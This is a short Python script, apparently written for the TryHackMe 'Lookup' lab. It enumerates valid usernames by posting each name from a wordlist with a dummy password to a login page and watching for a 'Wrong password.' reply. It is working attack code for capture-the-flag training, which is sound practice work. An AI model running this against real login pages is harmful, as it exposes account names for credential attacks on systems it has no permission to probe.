#Enumerates valid usernames
#Specific script used on Lookup Room on THM
#P.S You can also enumerate valid usernames using Hydra
import requests

try:
  with open('/home/student/name1.txt') as f: #Change this to a list of usernames to sort thru
    contents = f.readlines()
except FileNotFoundError:
  print("File not found!")


for i in contents:
  username = i.strip()
  #print("Testing: " + username)
  payload = {
    'username': username,
    'password': 'test123'
  }
  p = requests.post('http://lookup.thm/login.php', data=payload)
  #print(p.text)
  if "Wrong password." in p.text:
    print("Username found: ", username)
  else:
    continue
  #print(i.strip())
